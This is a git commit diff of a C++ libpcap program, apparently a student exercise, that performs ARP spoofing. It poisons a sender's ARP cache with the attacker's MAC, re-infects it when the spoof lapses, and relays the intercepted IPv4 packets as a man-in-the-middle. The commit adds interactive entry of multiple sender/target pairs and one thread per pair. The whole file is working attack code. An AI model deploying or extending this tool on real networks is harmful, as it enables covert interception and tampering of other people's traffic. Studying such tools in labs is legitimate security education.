51df8df79f1373f84f1486c734137ca87a491acd
MONTH4 <goei4559@gmail.com>
2023-08-08 14:36:13 +0900

    error_detc & input func

--- main.cpp
+++ main.cpp
@@ -10,7 +10,9 @@
 #include "arphdr.h"
 #include <thread>
 #include <mutex>
-
+#include <vector>
+#include <string>
+#include <sstream>
 #include <map>
 #include <string>
 #include <iostream>
@@ -22,7 +24,7 @@
 #define MTU 1500
 
 std::map<std::string, std::string> ip_to_mac;
-
+static std::mutex m;
 #pragma pack(push, 1)
 struct EthArpPacket final {
     EthHdr eth_;
@@ -93,14 +95,29 @@ unsigned char* getMyMac(const char* dev) {
     return mac_address;
 }
 
+std::pair<std::string, std::string> hex_to_string(Ip mip,Mac mmac){
+    std::string ip_str = static_cast<std::string>(mip);
+    std::string mac_str = static_cast<std::string>(mmac);
+    return std::make_pair(ip_str,mac_str);
+}
+
+void ip_to_mac_init(Ip mip,Mac mmac){
+    std::pair<std::string,std::string> p= hex_to_string(mip,mmac);
+    std::string modified_ip=p.first;
+    std::string modified_mac=p.second;
+    if(ip_to_mac.find(modified_ip) == ip_to_mac.end()) {
+        ip_to_mac[modified_ip] = modified_mac;
+    }
+}
+
 bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
-
     while (true) {
+        
         struct pcap_pkthdr* header;
         const u_char* responsePacket;
         int res = pcap_next_ex(handle, &header, &responsePacket);
@@ -112,6 +129,12 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
         
         // detection for eth-arp packet(sender'sip)
         EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;
+        if(ip_to_mac.find(static_cast<std::string>(recvPacket->arp_.sip_)) == ip_to_mac.end()){ 
+            ip_to_mac_init(htonl(recvPacket->arp_.sip_),recvPacket->arp_.smac_);
+        } 
+        if(ip_to_mac.find(static_cast<std::string>(recvPacket->arp_.tip_)) == ip_to_mac.end()){ 
+            ip_to_mac_init(htonl(recvPacket->arp_.tip_),recvPacket->arp_.tmac_);
+        }
         if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
             continue;
         }
@@ -121,14 +144,16 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
         if(recvPacket->arp_.sip_ != packet.arp_.tip_) {
             continue;
         }
-
+        
+        
+        
         memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); 
         memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);
         return true;
     }
 }
 
-bool sendArpSpoof(pcap_t* handle,const char* dev,char* sender,char* target) {
+bool sendArpSpoof(pcap_t* handle,const char* dev,const char* sender,const char* target) {
 
     EthArpPacket myPacket;
 
@@ -162,7 +187,7 @@ bool sendArpSpoof(pcap_t* handle,const char* dev,char* sender,char* target) {
     memcpy(&myPacket.eth_.smac_,mymac,MAC_SIZE);
     memcpy(&myPacket.arp_.smac_,mymac,MAC_SIZE);
 
-
+    free(mymac);
     if (!getSenderMac(handle, myPacket)) {
         printf("Failed to get sender MAC address.\n");
         return false;
@@ -177,9 +202,8 @@ bool sendArpSpoof(pcap_t* handle,const char* dev,char* sender,char* target) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         return false;
     }
-    printf("Spoofed ARP of target %s.\n", target);
+    printf("Spoofed ARP of target %s\n", target);
     return true;
-
 }
 
 
@@ -190,12 +214,13 @@ bool check_spoofed(pcap_t* handle) {
     struct libnet_ethernet_hdr* eth_hdr;
     while(1){
         int res = pcap_next_ex(handle, &header,&packet);
+        if (res==0){
+            return false;
+        }
         eth_hdr = (struct libnet_ethernet_hdr*)(packet);
         // If it's not an ARP packet, exit the function
-        printf("eth_hdr->ether_type is : %02x\n",eth_hdr->ether_type);
-        printf("ETHERTYPE_ARP IS : %02x\n",ETHERTYPE_ARP);
         if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP)
-            continue;
+            return false;
         printf("첫 번째 지나감\n");
         break;
     }    
@@ -220,132 +245,181 @@ bool check_spoofed(pcap_t* handle) {
         printf("ARP Spoofing Detected! Original MAC: %s, New MAC: %s\n", ip_to_mac[ip_str].c_str(), mac_str.c_str());
         return true;
     }
-    printf("mac is : %s\n",mac);
-    printf("ip_to_mac is %s\n",ip_to_mac[ip_str]);
+    printf("mac is : %s\n",mac_str.c_str());
+    printf("ip_to_mac is %s\n",ip_to_mac[ip_str].c_str());
     // Otherwise, map the IP to the MAC
-    ip_to_mac[ip_str] = mac_str;
 
     return false;
 }
 
-void reInfect(pcap_t* handle,const char* dev,char* sI,char* tI,std::mutex& m){
-    while(1){
-        std::lock_guard<std::mutex> lock(m);
-        if(check_spoofed(handle)==true){
-            printf("spoofed\n");
-        }
-        else{
-            printf("no spoofed\n");
-            sendArpSpoof(handle,dev,sI,tI);
-        }
-        m.unlock();
-        std::this_thread::yield();
+
+void reInfect(pcap_t* handle,const char* dev,const char* sI,const char* tI){
+    if(check_spoofed(handle)==true){
+        printf("spoofed\n");
+    }
+    else{
+        printf("no spoofed\n");
+        sendArpSpoof(handle,dev,sI,tI);
+        printf("ip_to_mac is : %s\n\n",ip_to_mac[std::string(sI)].c_str());
+        
     }
 }
 
-void relay_packet(pcap_t* handle,const char* dev,char* sI,char* tI,std::mutex& m) {
+void relay_packet(pcap_t* handle,const char* dev,const char* sI,const char* tI) {
     struct pcap_pkthdr* header;  // header pcap gives us
     const u_char *packet;       // actual packet
 
     // loop for packet capturing
 
     while (1) {
-        std::lock_guard<std::mutex> lock(m);
+        m.lock();
+        reInfect(handle,dev,sI,tI);
         int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0){ printf("res error\n"); continue;}
-        if (res == -1 || res == -2) break;
+        if (res == 0){ 
+            printf("res error\n");
+            m.unlock();
+            std::this_thread::yield();
+            continue;}
+        if (res == -1 || res == -2){
+            m.unlock();
+            printf("res==-1 or res==-2 continue\n\n");
+            std::this_thread::yield();
+            break;
+        }
 
         //Ip packet parsing
         // check Eth_type -> if ipv4 -> relay
         struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
         struct libnet_ipv4_hdr *ip_hdr=(struct libnet_ipv4_hdr*)(packet+sizeof(struct libnet_ethernet_hdr));
         char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
-        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) continue;
+        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
+            printf("293 line continue\n\n");
+            m.unlock();
+            std::this_thread::yield();
+            continue;}
         inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
         inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
-        if (strcmp(src_ip, sI) != 0) continue;
+        if (strcmp(src_ip, sI) != 0 ){
+            printf("src_ip is : %s, sI is : %s\n\n",src_ip,sI);
+            printf("dst_ip is : %s, tI is : %s\n\n",dst_ip,tI);
+            printf("strcmp(src_ip,si)!=0 여기소 continue\n\n");
+            m.unlock();
+            std::this_thread::yield();
+            continue;
+        } 
+
         printf("pass!\n");
-        if (strcmp(dst_ip, tI) != 0) continue;
         // modify smac to mine (attacker)
         printf("pass2!\n");
         unsigned char *m_mac= getMyMac(dev);
         if (m_mac == NULL) {
             fprintf(stderr, "Could not get MAC address.\n");
+            m.unlock();
+            std::this_thread::yield();
             return;
         }
 
-        // spoofed?? == 1) mac check()-1.1)src, 1.2)dst
-        // 2) ip check
-        // -2-2) sip check (against my ip)
-        // -2-3) dip check (my ip)
-        //  if not? spoofing and continue
-
-        
+        const char* d_mac = ip_to_mac[std::string(tI)].c_str();
+        std::cout << "mac addr is "<< ip_to_mac[std::string(tI)]<<"\n";
+        memcpy(eth_hdr->ether_dhost,d_mac,6);
         memcpy(eth_hdr->ether_shost, m_mac, 6);
         free(m_mac);         
         //send to target
 
         if (header->len > MTU) {
             printf("jumbo frame\n");
+            m.unlock();
+            std::this_thread::yield();
             continue;
         } else if (pcap_sendpacket(handle, packet, header->len) != 0) {
             fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+            m.unlock();
+            std::this_thread::yield();
             return;
         }
-        printf("good!\n");
+
         m.unlock();
-        std::this_thread::yield();
+        printf("good!\n");
     }
 }
 
-void run(pcap_t* handle,const char* dev,char* sI,char* tI){
-    std::mutex m;
-
-    std::thread t1(reInfect,handle,dev,sI,tI,std::ref(m));
-    std::thread t2(relay_packet,handle,dev,sI,tI,std::ref(m));
-
-    t1.join();
-    t2.join();
-}
-
-int main(int argc, char* argv[]) {
-	if (argc != 4) {
-		usage();
-		return -1;
-	}
-    char* dev = argv[1];
-    char *senderIp=argv[2];
-    char *targetIp=argv[3];
+void run(const char* dev,const char* sI,const char* tI){
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return -1;
+        return;
+    }
+    sendArpSpoof(handle,dev,sI,tI);
+    relay_packet(handle,dev,sI,tI);
+    pcap_close(handle); // 
+}
+bool isValidIP(const std::string& ip) {
+    std::istringstream iss(ip);
+    std::string segment;
+    int count = 0, value;
+
+    while (std::getline(iss, segment, '.')) {
+        count++;
+
+        std::istringstream issSegment(segment);
+        issSegment >> value;
+
+        if (segment.empty() || value < 0 || value > 255 || (issSegment.peek() != EOF))
+            return false;
     }
 
-    EthArpPacket myPacket;
+    return count == 4;
+}
 
-    //config default
-
-	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
-	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
-	myPacket.eth_.type_ = htons(EthHdr::Arp);
-
-	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
-	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
-	myPacket.arp_.hln_ = Mac::SIZE;
-	myPacket.arp_.pln_ = Ip::SIZE;
-	myPacket.arp_.op_ = htons(ArpHdr::Request);  
-	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
-	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
-	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	myPacket.arp_.tip_ = htonl(Ip(argv[2]));
-
-    // Get network information
+int main(int argc, char* argv[]) {
+	if (argc !=2) {
+		usage();
+		return -1;
+	}
+    std::cout << "Input pairs of sender's IP and target's IP you want in each line separated by a space. If you want to end, input 'N'\n";
     
-    run(handle,dev,senderIp,targetIp);
+    std::vector<std::string> senders;
+    std::vector<std::string> targets;
+    std::string line, sender, target;
 
+    while (true) {
+        std::cout << "Enter sender's IP and target's IP: \n";
+        std::getline(std::cin, line);
+        std::istringstream iss(line);
+        
+        iss >> sender >> target;
 
-    pcap_close(handle);
+        if (sender == "N" || sender == "n") {
+            break;
+        }
+
+        if (!isValidIP(sender) || !isValidIP(target)) {
+            std::cout << "Invalid IP format! Please input again.\n";
+            continue;
+        }
+
+        senders.push_back(sender);
+        targets.push_back(target);
+    }
+
+    std::cout << "\nInput ended.\n\n";
+    
+    for (size_t i = 0; i < senders.size(); ++i) {
+        std::cout << "Sender: " << senders[i] << ", Target: " << targets[i] << std::endl;
+    }
+
+    char* dev = argv[1];
+
+    // Thread화
+    std::vector<std::thread> work;
+    for(int i=0;i<senders.size();i++){
+        //init(myPacket[i],senderIp[i].c_str,targetIp[i].c_str);
+        work.push_back(std::thread(run,dev,senders[i].c_str(),targets[i].c_str()));
+
+    }
+    for(int i=0;i<senders.size();i++){
+        work[i].join();
+    }
     return 0;
 }
